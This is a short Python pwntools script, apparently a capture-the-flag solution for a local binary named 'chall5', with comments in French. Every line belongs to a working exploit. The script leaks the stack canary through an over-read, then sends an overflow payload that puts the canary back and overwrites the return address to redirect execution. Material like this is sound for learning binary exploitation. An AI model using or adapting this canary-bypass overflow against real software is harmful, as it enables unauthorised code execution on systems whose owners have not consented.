from pwn import *
import binascii

addr = p32(0x80486a6)
stack_size = 1024
buf_size = 500
junk_size = 4 + 1 # taille du canary manuel + le premier caractère du canary (on sait qu'il commence par 0x00)
offset_canary = 1008

payload_overread = b'A' * (buf_size + junk_size)

proc = process('./chall5')
proc.sendlineafter(b":", payload_overread)

canary = b'\x00' + proc.recvn(19+buf_size+junk_size+3)[-3:]
print("CANARY: ", canary)

payload = b'A' * offset_canary + canary + (stack_size - len(canary) - offset_canary) * b'A' + addr

proc.sendlineafter(b":", payload)

print(proc.recvall(timeout=3).decode())

proc.close()
